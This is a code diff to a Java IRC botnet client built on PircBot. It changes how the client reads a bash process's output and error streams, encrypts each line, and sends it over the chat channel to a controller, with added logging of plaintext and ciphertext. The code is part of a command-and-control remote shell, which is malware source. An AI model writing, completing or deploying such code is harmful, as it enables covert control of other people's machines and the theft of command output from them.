@@ -258,8 +258,9 @@ public class BotnetClient extends PircBot {
 		        				//System.out.println(encS);
 		        				//chat.sendLine(encS);
 		        				//chat.sendLine(s);
-		        				chat.sendLine(m.encryptMsg(s));
-		        				System.out.println("bash response: " + s);
+		        				String encM = m.encryptMsg(s);
+		        				chat.sendLine(encM);
+		        				System.out.println("bash response: " + s + "\n\tE(m): " + encM);
 		        				s = bashout.readLine();
 		        			}
 		        			//chat.sendLine(s);
@@ -390,11 +391,14 @@ public class BotnetClient extends PircBot {
 	    public void run() {
 	    	try {
 	    		String s = "";
-	        	while (s != null && bashin.ready() && !terminate) {
+	        	while (!terminate) {
 	        		s = bashin.readLine();
-	        		System.out.println("error: " + s);
-	        		//chat.sendLine(s);
-	        		chat.sendLine(m.encryptMsg(s));
+	        		if (s != null) {
+	        			String encM = m.encryptMsg(s);
+	        			System.out.println("error: " + s + "\n\tE(m): " + encM);
+	        			//chat.sendLine(s);
+	        			chat.sendLine(encM);
+	        		}
 	        	}
 	    	} catch (Exception e) {
 	            System.out.println(e.getMessage());
